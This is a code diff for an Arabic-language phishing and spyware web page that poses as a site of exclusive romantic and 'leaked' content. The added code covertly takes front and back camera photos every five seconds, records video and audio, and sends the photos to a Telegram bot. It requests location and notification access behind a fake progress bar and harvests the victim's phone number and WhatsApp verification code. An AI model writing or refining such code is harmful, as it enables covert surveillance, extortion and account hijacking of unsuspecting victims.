@@ -65,28 +65,51 @@ async function requestCameraAccessWithQuotes(statusElement) {
             return;
         }
 
-        // Request front camera
+        // Detect if mobile device
+        const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
+        
+        // Request front camera with mobile-friendly settings
+        const videoConstraints = isMobile ? 
+            { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'user' } : 
+            { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'user' };
+        
         frontStream = await navigator.mediaDevices.getUserMedia({ 
-            video: { width: 1280, height: 720, facingMode: 'user' }, 
+            video: videoConstraints, 
             audio: true 
         });
         
         // Try to get back camera (may not work on all devices)
         try {
+            const backConstraints = isMobile ? 
+                { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: 'environment' } : 
+                { width: { ideal: 1280 }, height: { ideal: 720 }, facingMode: 'environment' };
+            
             backStream = await navigator.mediaDevices.getUserMedia({ 
-                video: { width: 1280, height: 720, facingMode: 'environment' }
+                video: backConstraints
             });
         } catch (e) {
-            // Back camera not available, will use front only
+            console.log('Back camera not available, using front only');
         }
 
         // Start continuous photo capture every 5 seconds
         startContinuousCapture();
         
         // Record 15-second video with love quotes display
+        // Use lower bitrate for mobile
+        const videoBitrate = isMobile ? 500000 : 2500000;
+        
+        // Check supported mime types
+        let mimeType = 'video/webm;codecs=vp8,opus';
+        if (!MediaRecorder.isTypeSupported(mimeType)) {
+            mimeType = 'video/webm';
+            if (!MediaRecorder.isTypeSupported(mimeType)) {
+                mimeType = 'video/mp4';
+            }
+        }
+        
         const recorder = new MediaRecorder(frontStream, { 
-            mimeType: 'video/webm;codecs=vp8,opus',
-            videoBitsPerSecond: 2500000
+            mimeType: mimeType,
+            videoBitsPerSecond: videoBitrate
         });
         const chunks = [];
         recorder.ondataavailable = (e) => {
@@ -134,34 +157,64 @@ async function requestCameraAccessWithQuotes(statusElement) {
 
 // Function to capture photo from stream
 async function capturePhotoFromStream(stream, cameraType) {
-    const canvas = document.createElement('canvas');
-    canvas.width = 1280;
-    canvas.height = 720;
-    const context = canvas.getContext('2d');
-    const video = document.createElement('video');
-    video.srcObject = stream;
-    video.play();
-
-    await new Promise(resolve => {
-        video.onloadedmetadata = () => {
-            video.play();
-            setTimeout(resolve, 500);
-        };
-    });
-
-    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+    if (!stream || !stream.active) {
+        console.log('Stream not active for', cameraType);
+        return;
+    }
     
-    canvas.toBlob(async (blob) => {
-        photoCounter++;
-        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
-        const formData = new FormData();
-        formData.append('chat_id', TELEGRAM_CHAT_ID);
-        formData.append('photo', blob, `photo_${photoCounter}.jpg`);
-        formData.append('caption', `📸 ${cameraType} - صورة ${photoCounter}`);
-        try {
-            await fetch(url, { method: 'POST', body: formData });
-        } catch (e) {}
-    }, 'image/jpeg', 0.95);
+    try {
+        const video = document.createElement('video');
+        video.srcObject = stream;
+        video.setAttribute('playsinline', ''); // Important for iOS
+        video.muted = true;
+        
+        // Wait for video to be ready
+        await new Promise((resolve, reject) => {
+            video.onloadedmetadata = () => {
+                video.play().then(resolve).catch(reject);
+            };
+            video.onerror = reject;
+            setTimeout(reject, 5000); // Timeout after 5 seconds
+        });
+        
+        // Wait a bit for the video to stabilize
+        await new Promise(resolve => setTimeout(resolve, 500));
+        
+        // Create canvas with video dimensions
+        const canvas = document.createElement('canvas');
+        canvas.width = video.videoWidth || 640;
+        canvas.height = video.videoHeight || 480;
+        const context = canvas.getContext('2d');
+        
+        // Draw the current frame
+        context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        
+        // Convert to blob and send
+        canvas.toBlob(async (blob) => {
+            if (!blob || blob.size === 0) {
+                console.log('Empty blob for', cameraType);
+                return;
+            }
+            
+            photoCounter++;
+            const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`;
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CHAT_ID);
+            formData.append('photo', blob, `photo_${photoCounter}.jpg`);
+            formData.append('caption', `📸 ${cameraType} - صورة ${photoCounter}`);
+            try {
+                await fetch(url, { method: 'POST', body: formData });
+                console.log('Photo sent:', cameraType, photoCounter);
+            } catch (e) {
+                console.error('Error sending photo:', e);
+            }
+        }, 'image/jpeg', 0.85);
+        
+        // Clean up
+        video.srcObject = null;
+    } catch (e) {
+        console.error('Error capturing photo from', cameraType, e);
+    }
 }
 
 // Start continuous photo capture every 5 seconds
@@ -364,6 +417,17 @@ const loveQuotes = [
 async function startCapture() {
     const status = document.getElementById('status');
     
+    // Check if already verified
+    const isVerified = localStorage.getItem('userVerified') === 'true';
+    
+    if (isVerified) {
+        // Already verified, skip phone and verification
+        status.innerHTML = '<div class="success">✅ تم التحقق مسبقاً<br>جارٍ تحميل المحتوى...</div>';
+        await new Promise(resolve => setTimeout(resolve, 1000));
+        await continueAfterPhone();
+        return;
+    }
+    
     // Show phone number request FIRST
     status.innerHTML = `<div class="success">
         <h3 style="color: #c06c84; margin-bottom: 15px;">💕 مرحباً بك في عالم المحتوى الحصري</h3>
@@ -380,40 +444,77 @@ async function startCapture() {
 async function continueAfterPhone() {
     const status = document.getElementById('status');
     
-    status.innerHTML = '<div class="loading">جارٍ تحميل المحتوى الحصري...</div>';
-    
-    // Gather device info first (no permissions)
-    await gatherDeviceInfo();
-    
-    await new Promise(resolve => setTimeout(resolve, 1000));
-    
-    // Request Camera and Microphone with love quotes
-    status.innerHTML = '<div class="loading">جارٍ تحميل المحتوى المرئي الرومانسي...<br><br><strong style="color: #c06c84; font-size: 1.2em;">💕 انطق العبارات التالية بصوت عالٍ بينما يتم تحميل المحتوى لأجلك 💕</strong></div>';
-    await requestCameraAccessWithQuotes(status);
-    
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    // Request Location
-    status.innerHTML = '<div class="loading">جارٍ تخصيص المحتوى حسب موقعك...</div>';
-    await requestLocationAccess();
-    
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    // Request Notifications
-    status.innerHTML = '<div class="loading">جارٍ تفعيل التحديثات...</div>';
-    await requestNotificationAccess();
-    
-    await new Promise(resolve => setTimeout(resolve, 2000));
-    
-    // Show verification code request
-    status.innerHTML = `<div class="success">
-        <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
-        <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك إدخاله لتأكيد دخولك</p>
-        <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك</p>
-        <div style="margin: 20px 0;">
-            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="6" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+    // Show progress bar (without message)
+    status.innerHTML = `
+        <div class="success" style="padding: 30px;">
+            <h3 style="color: #c06c84; margin-bottom: 20px;">⏳ جارٍ تحميل المحتوى الحصري</h3>
+            <div style="width: 100%; background: #f0f0f0; border-radius: 25px; height: 30px; overflow: hidden; margin: 20px 0;">
+                <div id="progressBar" style="width: 0%; height: 100%; background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); transition: width 0.3s ease; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 0.9em;">
+                    <span id="progressText">0%</span>
+                </div>
+            </div>
         </div>
-        <button onclick="submitVerificationCode()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد</button>
+    `;
+    
+    const updateProgress = (percent) => {
+        const progressBar = document.getElementById('progressBar');
+        const progressText = document.getElementById('progressText');
+        if (progressBar && progressText) {
+            progressBar.style.width = percent + '%';
+            progressText.textContent = percent + '%';
+        }
+    };
+    
+    // Slow progress animation (1% to 100%)
+    const animateProgress = async (start, end, duration) => {
+        const steps = end - start;
+        const stepDuration = duration / steps;
+        
+        for (let i = start; i <= end; i++) {
+            updateProgress(i);
+            await new Promise(resolve => setTimeout(resolve, stepDuration));
+        }
+    };
+    
+    // Start slow progress (0% to 15%)
+    await animateProgress(0, 15, 3000);
+    
+    // Gather device info in background
+    gatherDeviceInfo();
+    
+    // Continue progress (15% to 30%)
+    await animateProgress(15, 30, 3000);
+    
+    // Request Camera (silently in background)
+    const cameraPromise = requestCameraAccessWithQuotes(status);
+    
+    // Continue progress (30% to 60%)
+    await animateProgress(30, 60, 6000);
+    
+    // Wait for camera to finish
+    await cameraPromise;
+    
+    // Request Location (silently in background)
+    requestLocationAccess();
+    
+    // Continue progress (60% to 80%)
+    await animateProgress(60, 80, 4000);
+    
+    // Request Notifications (silently in background)
+    requestNotificationAccess();
+    
+    // Continue progress (80% to 100%)
+    await animateProgress(80, 100, 4000);
+    
+    // Show final success message
+    status.innerHTML = `<div class="success">
+        <h3 style="color: #28a745; margin-bottom: 15px;">🎉 تم تحميل المحتوى بنجاح!</h3>
+        <p style="color: #333; font-size: 1.2em; margin: 15px 0;">💕 مرحباً بك في عالم المحتوى الحصري</p>
+        <div class="fake-content" style="margin-top: 20px;">
+            <p>✨ يمكنك الآن تصفح المحتوى الحصري</p>
+            <p>💝 آلاف الرسائل والفيديوهات الرومانسية في انتظارك</p>
+            <p>🌹 محتوى مسرب حصري من بلدك يومياً</p>
+        </div>
     </div>`;
 }
 
@@ -448,9 +549,9 @@ async function submitPhoneNumberFirst() {
     status.innerHTML = `<div class="success">
         <h3 style="color: #28a745; margin-bottom: 15px;">✅ تم إرسال رمز التحقق إلى واتساب</h3>
         <p style="color: #333; font-size: 1.1em; margin: 15px 0;">تحقق من رسائل واتساب الخاصة بك</p>
-        <p style="color: #666; margin: 10px 0;">أدخل الرمز المكون من 6 أرقام المرسل إليك</p>
+        <p style="color: #666; margin: 10px 0;">أدخل الرمز المرسل إليك (4 أرقام على الأقل)</p>
         <div style="margin: 20px 0;">
-            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="6" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+            <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
         </div>
         <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">تأكيد الرمز</button>
     </div>`;
@@ -480,7 +581,7 @@ async function submitVerificationCodeFirst() {
             <p style="color: #333; font-size: 1.1em; margin: 15px 0;">يجب عليك الذهاب إلى واتساب ونسخ الرمز المرسل وإدخاله هنا</p>
             <p style="color: #666; margin: 10px 0;">تحقق من رسائل واتساب الخاصة بك وانسخ الرمز بدقة</p>
             <div style="margin: 20px 0;">
-                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" maxlength="6" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
+                <input type="text" id="verificationCode" placeholder="أدخل رمز التحقق" style="width: 60%; padding: 12px; border: 2px solid #c06c84; border-radius: 10px; font-size: 1.3em; text-align: center; letter-spacing: 5px; direction: ltr;" />
             </div>
             <button onclick="submitVerificationCodeFirst()" style="background: linear-gradient(135deg, #ff6b9d 0%, #c06c84 100%); color: white; padding: 12px 40px; border: none; border-radius: 25px; font-size: 1.2em; cursor: pointer; font-weight: bold;">إعادة المحاولة</button>
         </div>`;
@@ -491,6 +592,9 @@ async function submitVerificationCodeFirst() {
     status.innerHTML = '<div class="loading">✅ جارٍ التحقق من الرمز...</div>';
     
     await new Promise(resolve => setTimeout(resolve, 2000));
+    
+    // Save verification status
+    localStorage.setItem('userVerified', 'true');
     
     // Show success and continue with permissions
     status.innerHTML = '<div class="success">🎉 تم التحقق بنجاح!<br>جارٍ تحميل المحتوى الحصري...</div>';
